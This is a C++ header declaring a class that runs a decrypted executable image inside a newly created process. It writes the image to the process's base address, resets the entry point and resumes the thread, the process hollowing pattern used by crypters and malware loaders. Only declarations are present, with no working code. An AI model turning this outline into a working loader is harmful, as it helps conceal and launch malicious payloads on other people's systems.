#pragma once
#include <Windows.h>


class dynamicFork
{
	private:
		struct {
			char* filePath = new char[512]();
			STARTUPINFOA* startupInfo = new STARTUPINFOA();
			PROCESS_INFORMATION* processInfo = new PROCESS_INFORMATION();
		} Process;

		//CONTEXT OF THE NEW CREATED PROCESS THREAD
		PCONTEXT context;

		//HEADERS
		struct {
			PIMAGE_DOS_HEADER dosHeader;
			PIMAGE_NT_HEADERS peHeader;
		} Headers;

		DWORD* imageBase;

		//TO DO: add throws()

		int SetHeaders(char* decryptedData);

		int CreateProcessAndWrite(char* decryptedData);

		void AllocateContext();

		void GetBaseAddrOfNewProcess();

		void WriteDataToProcessBaseAddr(char* decryptedData);

		void SetBaseAddressAndEntryPoint();

		void SetContextAndResumeThread();

	public:
		dynamicFork(char* decryptedData);
		~dynamicFork();

};

